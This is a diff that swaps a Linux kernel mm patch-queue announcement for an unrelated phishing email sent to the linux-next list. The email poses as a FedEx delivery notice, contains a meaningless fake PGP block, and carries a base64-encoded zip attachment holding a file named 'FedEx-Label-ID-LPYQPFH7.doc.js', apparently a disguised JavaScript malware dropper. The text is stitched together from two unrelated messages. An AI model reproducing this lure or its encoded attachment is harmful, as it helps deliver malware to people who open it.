@@ -1,283 +1,79 @@
-From: akpm@linux-foundation.org
-Subject: mmotm 2017-03-17-15-26 uploaded
-Date: Fri, 17 Mar 2017 15:26:41 -0700
-Message-ID: <58cc62a1.IroITrn3CK9Mcrjy%akpm@linux-foundation.org>
-Mime-Version: 1.0
+From: CGI-Mailer <cgi-mailer@kundenserver.de>
+Subject: Item Delivery Notification
+Date: Sat, 18 Mar 2017 07:08:22 +0100
+Message-ID: <0XjUXe-1crbZf0Si1-006u63@infongd3070.rtr.kundenserver.de>
+Content-Type: multipart/mixed;
+        boundary="bnd_52901e89c974e8e7176ac3f7567422e0"
+Content-Transfer-Encoding: 8bit
+Return-path: <linux-next-owner@vger.kernel.org>
+Received: from ibizailusion.com ([212.227.55.111]:53968 "EHLO ibizailusion.com"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with ESMTP
+        id S1751030AbdCRKJE (ORCPT <rfc822;linux-next@vger.kernel.org>);
+        Sat, 18 Mar 2017 06:09:04 -0400
+Received: from [127.0.0.1] (helo=infongd3070.rtr.kundenserver.de)
+        by ibizailusion.com with esmtp (Exim 4.72)
+        (envelope-from <cgi-mailer-bounces-322344012@kundenserver.de>)
+        id 1cp7XK-0000Lj-3z
+        for linux-next@vger.kernel.org; Sat, 18 Mar 2017 07:08:22 +0100
+Sender: linux-next-owner@vger.kernel.org
+List-ID: <linux-next.vger.kernel.org>
+To: linux-next@vger.kernel.org
+
+--bnd_52901e89c974e8e7176ac3f7567422e0
 Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Return-path: <owner-linux-mm@kvack.org>
-Sender: owner-linux-mm@kvack.org
-To: mm-commits@vger.kernel.org, linux-kernel@vger.kernel.org, linux-mm@kvack.org, linux-fsdevel@vger.kernel.org, linux-next@vger.kernel.org, sfr@canb.auug.org.au, mhocko@suse.cz, broonie@kernel.org
-List-Id: linux-next.vger.kernel.org
 
-The mm-of-the-moment snapshot 2017-03-17-15-26 has been uploaded to
+Dear Customer,
 
-   http://www.ozlabs.org/~akpm/mmotm/
+Please check your package delivery details attached!
 
-mmotm-readme.txt says
+FedEx
 
-README for mm-of-the-moment:
+-----BEGIN PGP PUBLIC KEY BLOCK-----
 
-http://www.ozlabs.org/~akpm/mmotm/
-
-This is a snapshot of my -mm patch queue.  Uploaded at random hopefully
-more than once a week.
-
-You will need quilt to apply these patches to the latest Linus release (4.x
-or 4.x-rcY).  The series file is in broken-out.tar.gz and is duplicated in
-http://ozlabs.org/~akpm/mmotm/series
-
-The file broken-out.tar.gz contains two datestamp files: .DATE and
-.DATE-yyyy-mm-dd-hh-mm-ss.  Both contain the string yyyy-mm-dd-hh-mm-ss,
-followed by the base kernel version against which this patch series is to
-be applied.
-
-This tree is partially included in linux-next.  To see which patches are
-included in linux-next, consult the `series' file.  Only the patches
-within the #NEXT_PATCHES_START/#NEXT_PATCHES_END markers are included in
-linux-next.
-
-A git tree which contains the memory management portion of this tree is
-maintained at git://git.kernel.org/pub/scm/linux/kernel/git/mhocko/mm.git
-by Michal Hocko.  It contains the patches which are between the
-"#NEXT_PATCHES_START mm" and "#NEXT_PATCHES_END" markers, from the series
-file, http://www.ozlabs.org/~akpm/mmotm/series.
+5QgOYrtlF07UvON0ew8Lpi8QpBuf+3ZbmyJuu3ftImncdVFH6np6sb8XKp+RwYRV32KmHd7G4dPe
+fLgLr3oZkUiPHcPhFBZCusWJH6PuoRGY1L79vPX+LZtLJSxSIgbcIcODYwXy7P6VKVo6SQhQVIVj
+nmCyHWqQBoyjwu3br3aa1KYlHnz/VxHrm/a4WD2U7aHmsHH7Bcgkb1ltTKzOg8ektyfYu3JOAc7y
+xUr492o+ytG4VovNMBXwPP/pQ+k9CyS0D3WF24yqjuoRp0m9rfsK1bZIkuGEpThSSFwHNZ9ynBxI
+2uJ/WTTLZbkpilA4HMbBX3TQi0+hnlL6QPN1SjjIXMnaNn5bq1FmSEXCBQzuVugc7kn6b8+Xd5aw
+XP8ko8HF6vMMR096XbdMlvXdrcVtlxX6ikIeZ71Iw+HA+Kxj43rQw4V5jdZqgXtOol4quFbP52UL
+dSeE/CIIRgsP4Ct1232mYtZ1a6Sy/gLOK0HK9Gig0gR31lLgH/cXd3G80lW+IQEafvbe64sruo2c
+8Gyymx6T//bM52JgY8zyaJzREqvUtamrre9BJJsvPkUzub44LMHBQ3YHmLKWvkt89SmIa1fmiBtV
+1ZlfzaQjg71MOCdeesBbeCAzggh3awBiznLpgoQO2dgqJVicjyh76tbmla6toukPGsDNzuR3GEri
+iGIyvY1fME5ffmN6PtDxQZAKbkpvFcZi9JMxMHaRSlzWA9SgHPXz+ApuFYC1uSSTqv9TtpgXpobO
+VTm526DExfRznp9uu79/vqcLwPjt2QVDW8CCRkHc6IRlvitVWMQb8peVioTIeKY4NNAdNuEadPNL
+AfMd2qG+yGX6j4Pntvn0a2AMlytMyoss6ROJqdf+kf7nGkk1qXvXriW1+4YIBIseiKfU8pfdQuJY
+WFVaivhVVRQnbaZYomyVqW5gJuSf+Rj60XCG4L2AqSyEVfFTNq1MpgEuh0kGLuSM6izBsEiO6yHL
+J3uQFCil/Jz9eoeRFfFhdVqfqnxl+EYzXi/bFfKg2ri4rVjy+xw6pjwFHk56sTlw5n9QKdClqdUf
+vMfZhsIuJTTtVbN4wtaOOh4vGMcGP45MUulR9t4ahofkdAhegf/6XGr2Ji1SOrnIVNBCS63aoliR
+Z0yQJmKH2H2zcV/sZp5aWnEnMEuN7CIG9XNwFifoEq2XFF/2oMpyQC+O5ema+t3vpDC2FojvbThL
+ScTFwUPkfQaWXShzYOqPZI3rKTwi85XL5avfwlQlHyxS+L0+to8111DNDJyoZhYFt2o1h3hl1p0Z
+GNZkuc41V0G4nyNu907MqTGusQH659hClbWDs1yCrA==
 
 
-A full copy of the full kernel tree with the linux-next and mmotm patches
-already applied is available through git within an hour of the mmotm
-release.  Individual mmotm releases are tagged.  The master branch always
-points to the latest release, so it's constantly rebasing.
-
-http://git.cmpxchg.org/cgit.cgi/linux-mmotm.git/
-
-To develop on top of mmotm git:
-
-  $ git remote add mmotm git://git.kernel.org/pub/scm/linux/kernel/git/mhocko/mm.git
-  $ git remote update mmotm
-  $ git checkout -b topic mmotm/master
-  <make changes, commit>
-  $ git send-email mmotm/master.. [...]
-
-To rebase a branch with older patches to a new mmotm release:
-
-  $ git remote update mmotm
-  $ git rebase --onto mmotm/master <topic base> topic
+-----END PGP PUBLIC KEY BLOCK-----
 
 
+--bnd_52901e89c974e8e7176ac3f7567422e0
+Content-Type: application/zip; name="FedEx-Label-ID-LPYQPFH7.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=FedEx-Label-ID-LPYQPFH7.zip
+
+UEsDBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXAAAARmVkRXgtTGFiZWwtSUQtTFBZUVBGSDcAAAAA
+AAAAAAAAAABQSwMEFAAAAAgAAAAAAEDGGKgsAgAAQQMAADYAAABGZWRFeC1MYWJlbC1JRC1MUFlR
+UEZINy9GZWRFeC1MYWJlbC1JRC1MUFlRUEZINy5kb2MuanM9Um1P2zAQ/lyk/gfLHyBRwEtLS2GM
+TQIGFVD6OqCbpslNnMRN4li2C2lQ//vOaSHK3eWe585+fE5z75UqVKILhCXNci0VF7Fmr0wYTQQz
+yCQsKIRRfLEyQEU0MIUihYrRWhuI2VqxSvCUBEWOgmKlNNMkLrRk2UJREUJPTcE6b8SoFayWS6p1
+yDSPRb0HJlpm3DgYYfe8WQvKrSC/flq99lU0e8zTzvzs5FF2T8d3yfyXeI7789vBU/949Tbvyt6a
+0pNJMslGQdn7zQrzlrzch09Verca9tLgkR/18jZPp2MzCFdrPj16Tnr831l8e3ncWcpxdEOvpTq5
+kf2Xyel4PQrEQ358X50NLsP7zhLvRFV2TAfyYJfSXNg8sXlUKORYkF/454h/K0nGRGwS+PY8t7n3
+3mjuNSzPoOV5GiguDblSjBo2XCxZAIcfYA9PXwYPbQKuP5uN6mE0jFqDfwer+3liJ3MLtT/BZlba
+ljDL1FLlH/73E6tqgV8OPoHUWMBsAUYKyYTDk0NkUziOh2FNg21IjfVV6eGvEIR97Q42YrhlYZiq
+66pt0w/s5Yd2FWsRzTRzd3toJkLHJh8aFEhgRDEtC6HZjJXmU17OJZBd3+uAdX2/JniEHLUbJ/pe
+1+zvI0W4CFk5jJzcBdQB2GsdtXy/7bq2qx7YdmIpjUM7GrX7zXKXLAsuHEy3EwaVrzRztnUfShsL
+uJy0pjfWb8ACaoLEYe7uPiy+Of8PQMYYqCwCAABBAwAAUEsBAgAACgAAAAAAAAAAAAAAAAAAAAAA
+AAAAABcAAAAAAAAAAAAQAAAAAAAAAEZlZEV4LUxhYmVsLUlELUxQWVFQRkg3UEsBAgAAFAAAAAgA
+AAAAAEDGGKgsAgAAQQMAADYAAAAAAAAAAAAgAAAAQQAAAEZlZEV4LUxhYmVsLUlELUxQWVFQRkg3
+L0ZlZEV4LUxhYmVsLUlELUxQWVFQRkg3LmRvYy5qc1BLBQYAAAAAAgACAKkAAADNAgAAAAA=
 
 
-The directory http://www.ozlabs.org/~akpm/mmots/ (mm-of-the-second)
-contains daily snapshots of the -mm tree.  It is updated more frequently
-than mmotm, and is untested.
-
-A git copy of this tree is available at
-
-	http://git.cmpxchg.org/cgit.cgi/linux-mmots.git/
-
-and use of this tree is similar to
-http://git.cmpxchg.org/cgit.cgi/linux-mmotm.git/, described above.
-
-
-This mmotm tree contains the following patches against 4.11-rc2:
-(patches marked "*" will be included in linux-next)
-
-  origin.patch
-  i-need-old-gcc.patch
-* mm-migrate-fix-remove_migration_pte-for-ksm-pages.patch
-* mm-move-mm_percpu_wq-initialization-earlier.patch
-* arm-arch-arm-include-asm-pageh-needs-personalityh.patch
-* dax-add-tracepoints-to-dax_iomap_pte_fault.patch
-* dax-add-tracepoints-to-dax_pfn_mkwrite.patch
-* dax-add-tracepoints-to-dax_load_hole.patch
-* dax-add-tracepoints-to-dax_writeback_mapping_range.patch
-* dax-add-tracepoints-to-dax_writeback_mapping_range-fix.patch
-* dax-add-tracepoint-to-dax_writeback_one.patch
-* dax-add-tracepoint-to-dax_insert_mapping.patch
-* fs-ocfs2-cluster-use-setup_timer.patch
-* ocfs2-old-mle-put-and-release-after-the-function-dlm_add_migration_mle-called.patch
-* ocfs2-old-mle-put-and-release-after-the-function-dlm_add_migration_mle-called-fix.patch
-* ocfs2-dlm-optimization-of-code-while-free-dead-node-locks.patch
-* ocfs2-dlm-optimization-of-code-while-free-dead-node-locks-checkpatch-fixes.patch
-* block-restore-proc-partitions-to-not-display-non-partitionable-removable-devices.patch
-  mm.patch
-* mm-fix-100%-cpu-kswapd-busyloop-on-unreclaimable-nodes.patch
-* mm-fix-100%-cpu-kswapd-busyloop-on-unreclaimable-nodes-fix.patch
-* mm-fix-100%-cpu-kswapd-busyloop-on-unreclaimable-nodes-fix-2.patch
-* mm-fix-check-for-reclaimable-pages-in-pf_memalloc-reclaim-throttling.patch
-* mm-remove-seemingly-spurious-reclaimability-check-from-laptop_mode-gating.patch
-* mm-remove-unnecessary-reclaimability-check-from-numa-balancing-target.patch
-* mm-dont-avoid-high-priority-reclaim-on-unreclaimable-nodes.patch
-* mm-dont-avoid-high-priority-reclaim-on-memcg-limit-reclaim.patch
-* mm-delete-nr_pages_scanned-and-pgdat_reclaimable.patch
-* revert-mm-vmscan-account-for-skipped-pages-as-a-partial-scan.patch
-* mm-remove-unnecessary-back-off-function-when-retrying-page-reclaim.patch
-* writeback-use-setup_deferrable_timer.patch
-* mm-delete-unnecessary-ttu_-flags.patch
-* mm-dont-assume-anonymous-pages-have-swapbacked-flag.patch
-* mm-move-madv_free-pages-into-lru_inactive_file-list.patch
-* mm-move-madv_free-pages-into-lru_inactive_file-list-checkpatch-fixes.patch
-* mm-reclaim-madv_free-pages.patch
-* mm-reclaim-madv_free-pages-fix.patch
-* mm-fix-lazyfree-bug-on-check-in-try_to_unmap_one.patch
-* mm-fix-lazyfree-bug-on-check-in-try_to_unmap_one-fix.patch
-* mm-enable-madv_free-for-swapless-system.patch
-* proc-show-madv_free-pages-info-in-smaps.patch
-* proc-show-madv_free-pages-info-in-smaps-fix.patch
-* mm-memcontrol-provide-shmem-statistics.patch
-* thp-reduce-indentation-level-in-change_huge_pmd.patch
-* thp-fix-madv_dontneed-vs-numa-balancing-race.patch
-* mm-drop-unused-pmdp_huge_get_and_clear_notify.patch
-* thp-fix-madv_dontneed-vs-madv_free-race.patch
-* thp-fix-madv_dontneed-vs-madv_free-race-fix.patch
-* thp-fix-madv_dontneed-vs-clear-soft-dirty-race.patch
-* mm-swap-fix-a-race-in-free_swap_and_cache.patch
-* mm-use-is_migrate_highatomic-to-simplify-the-code.patch
-* mm-use-is_migrate_highatomic-to-simplify-the-code-fix.patch
-* mm-use-is_migrate_isolate_page-to-simplify-the-code.patch
-* mm-vmstat-print-non-populated-zones-in-zoneinfo.patch
-* mm-vmstat-suppress-pcp-stats-for-unpopulated-zones-in-zoneinfo.patch
-* sparc64-ng4-memset-32-bits-overflow.patch
-* mm-zeroing-hash-tables-in-allocator.patch
-* mm-updated-callers-to-use-hash_zero-flag.patch
-* mm-adaptive-hash-table-scaling.patch
-* zram-reduce-load-operation-in-page_same_filled.patch
-* lockdep-teach-lockdep-about-memalloc_noio_save.patch
-* lockdep-allow-to-disable-reclaim-lockup-detection.patch
-* xfs-abstract-pf_fstrans-to-pf_memalloc_nofs.patch
-* mm-introduce-memalloc_nofs_saverestore-api.patch
-* mm-introduce-memalloc_nofs_saverestore-api-fix.patch
-* xfs-use-memalloc_nofs_saverestore-instead-of-memalloc_noio.patch
-* jbd2-mark-the-transaction-context-with-the-scope-gfp_nofs-context.patch
-* jbd2-mark-the-transaction-context-with-the-scope-gfp_nofs-context-fix.patch
-* jbd2-make-the-whole-kjournald2-kthread-nofs-safe.patch
-* jbd2-make-the-whole-kjournald2-kthread-nofs-safe-checkpatch-fixes.patch
-* mm-tighten-up-the-fault-path-a-little.patch
-* mm-remove-rodata_test_data-export-add-pr_fmt.patch
-* mm-move-pcp-and-lru-pcp-drainging-into-single-wq.patch
-* mm-move-pcp-and-lru-pcp-drainging-into-single-wq-fix.patch
-* mm-compaction-reorder-fields-in-struct-compact_control.patch
-* mm-compaction-remove-redundant-watermark-check-in-compact_finished.patch
-* mm-page_alloc-split-smallest-stolen-page-in-fallback.patch
-* mm-page_alloc-count-movable-pages-when-stealing-from-pageblock.patch
-* mm-compaction-change-migrate_async_suitable-to-suitable_migration_source.patch
-* mm-compaction-add-migratetype-to-compact_control.patch
-* mm-compaction-restrict-async-compaction-to-pageblocks-of-same-migratetype.patch
-* mm-compaction-finish-whole-pageblock-to-reduce-fragmentation.patch
-* mm-do-not-use-double-negation-for-testing-page-flags.patch
-* mm-vmscan-fix-zone-balance-check-in-prepare_kswapd_sleep.patch
-* mm-vmscan-only-clear-pgdat-congested-dirty-writeback-state-when-balanced.patch
-* mm-vmscan-prevent-kswapd-sleeping-prematurely-due-to-mismatched-classzone_idx.patch
-* mm-page_alloc-__gfp_nowarn-shouldnt-suppress-stall-warnings.patch
-* mm-sparse-refine-usemap_size-a-little.patch
-* mm-compaction-ignore-block-suitable-after-check-large-free-page.patch
-* mm-vmscan-more-restrictive-condition-for-retry-in-do_try_to_free_pages.patch
-* mm-remove-unncessary-ret-in-page_referenced.patch
-* mm-remove-swap_dirty-in-ttu.patch
-* mm-remove-swap_mlock-check-for-swap_success-in-ttu.patch
-* mm-make-the-try_to_munlock-void-function.patch
-* mm-remove-swap_mlock-in-ttu.patch
-* mm-remove-swap_again-in-ttu.patch
-* mm-make-ttus-return-boolean.patch
-* mm-make-rmap_walk-void-function.patch
-* mm-make-rmap_one-boolean-function.patch
-* mm-remove-swap_.patch
-* mm-remove-swap_-fix.patch
-* mm-swap-fix-comment-in-__read_swap_cache_async.patch
-* mm-swap-improve-readability-via-make-spin_lock-unlock-balanced.patch
-* mm-swap-avoid-lock-swap_avail_lock-when-held-cluster-lock.patch
-* mm-page_alloc-return-0-in-case-this-node-has-no-page-within-the-zone.patch
-* mm-vmscan-do-not-pass-reclaimed-slab-to-vmpressure.patch
-* mm-page_owner-align-with-pageblock_nr-pages.patch
-* mm-walk-the-zone-in-pageblock_nr_pages-steps.patch
-* kasan-introduce-helper-functions-for-determining-bug-type.patch
-* kasan-unify-report-headers.patch
-* kasan-change-allocation-and-freeing-stack-traces-headers.patch
-* kasan-simplify-address-description-logic.patch
-* kasan-change-report-header.patch
-* kasan-improve-slab-object-description.patch
-* kasan-print-page-description-after-stacks.patch
-* kasan-improve-double-free-report-format.patch
-* kasan-separate-report-parts-by-empty-lines.patch
-* kasan-allow-kasan_check_read-write-to-accept-pointers-to-volatiles.patch
-* asm-generic-x86-wrap-atomic-operations.patch
-* asm-generic-add-kasan-instrumentation-to-atomic-operations.patch
-* proc-remove-cast-from-memory-allocation.patch
-* drivers-virt-use-get_user_pages_unlocked.patch
-* locking-hung_task-defer-showing-held-locks.patch
-* revert-lib-test_sortc-make-it-explicitly-non-modular.patch
-* lib-add-module-support-to-array-based-sort-tests.patch
-* lib-add-module-support-to-linked-list-sorting-tests.patch
-* firmware-makefile-force-recompilation-if-makefile-changes.patch
-* checkpatch-remove-obsolete-config_experimental-checks.patch
-* checkpatch-add-ability-to-find-bad-uses-of-vsprintf-%pfoo-extensions.patch
-* checkpatch-add-ability-to-find-bad-uses-of-vsprintf-%pfoo-extensions-fix.patch
-* checkpatch-add-ability-to-find-bad-uses-of-vsprintf-%pfoo-extensions-fix-fix.patch
-* checkpatch-improve-embedded_function_name-test.patch
-* cpumask-make-nr_cpumask_bits-unsigned.patch
-* kdump-vmcoreinfo-report-actual-value-of-phys_base.patch
-* uapi-fix-linux-sysctlh-userspace-compilation-errors.patch
-* taskstats-add-e-u-stime-for-tgid-command.patch
-* taskstats-add-e-u-stime-for-tgid-command-fix.patch
-* taskstats-add-e-u-stime-for-tgid-command-fix-fix.patch
-* scripts-gdb-add-lx-fdtdump-command.patch
-* initramfs-provide-a-way-to-ignore-image-provided-by-bootloader.patch
-* initramfs-use-vfs_stat-lstat-directly.patch
-  linux-next.patch
-  linux-next-rejects.patch
-  linux-next-git-rejects.patch
-* drivers-gpu-drm-i915-selftests-i915_selftestc-fix-build-with-gcc-444.patch
-* mm-introduce-kvalloc-helpers.patch
-* mm-support-__gfp_repeat-in-kvmalloc_node-for-32kb.patch
-* rhashtable-simplify-a-strange-allocation-pattern.patch
-* ila-simplify-a-strange-allocation-pattern.patch
-* xattr-zero-out-memory-copied-to-userspace-in-getxattr.patch
-* treewide-use-kvalloc-rather-than-opencoded-variants.patch
-* net-use-kvmalloc-with-__gfp_repeat-rather-than-open-coded-variant.patch
-* md-use-kvmalloc-rather-than-opencoded-variant.patch
-* bcache-use-kvmalloc.patch
-* mm-vmalloc-use-__gfp_highmem-implicitly.patch
-* scripts-spellingtxt-add-memory-pattern-and-fix-typos.patch
-* scripts-spellingtxt-add-regsiter-register-spelling-mistake.patch
-* scripts-spellingtxt-add-intialised-pattern-and-fix-typo-instances.patch
-* treewide-move-set_memory_-functions-away-from-cacheflushh.patch
-* arm-use-set_memoryh-header.patch
-* arm64-use-set_memoryh-header.patch
-* s390-use-set_memoryh-header.patch
-* x86-use-set_memoryh-header.patch
-* agp-use-set_memoryh-header.patch
-* drm-use-set_memoryh-header.patch
-* drm-use-set_memoryh-header-fix.patch
-* intel_th-use-set_memoryh-header.patch
-* watchdog-hpwdt-use-set_memoryh-header.patch
-* bpf-use-set_memoryh-header.patch
-* module-use-set_memoryh-header.patch
-* pm-hibernate-use-set_memoryh-header.patch
-* alsa-use-set_memoryh-header.patch
-* misc-sram-use-set_memoryh-header.patch
-* video-vermilion-use-set_memoryh-header.patch
-* drivers-staging-media-atomisp-pci-atomisp2-use-set_memoryh.patch
-* treewide-decouple-cacheflushh-and-set_memoryh.patch
-* x86-atomic-move-__atomic_add_unless-out-of-line.patch
-* x86-atomic-move-__atomic_add_unless-out-of-line-fix.patch
-* sched-out-of-line-__update_load_avg.patch
-* kref-remove-warn_on-for-null-release-functions.patch
-* megasas-remove-expensive-inline-from-megasas_return_cmd.patch
-* remove-expensive-warn_on-in-pagefault_disabled_dec.patch
-* tracing-move-trace_handle_return-out-of-line.patch
-* hpet-make-cmd-parameter-of-hpet_ioctl_common-unsigned.patch
-  mm-add-strictlimit-knob-v2.patch
-  make-sure-nobodys-leaking-resources.patch
-  releasing-resources-with-children.patch
-  make-frame_pointer-default=y.patch
-  kernel-forkc-export-kernel_thread-to-modules.patch
-  mutex-subsystem-synchro-test-module.patch
-  slab-leaks3-default-y.patch
-  add-debugging-aid-for-memory-initialisation-problems.patch
-  workaround-for-a-pci-restoring-bug.patch
-
---
-To unsubscribe, send a message with 'unsubscribe linux-mm' in
-the body to majordomo@kvack.org.  For more info on Linux MM,
-see: http://www.linux-mm.org/ .
-Don't email: <a href=mailto:"dont@kvack.org"> email@kvack.org </a>
+--bnd_52901e89c974e8e7176ac3f7567422e0--
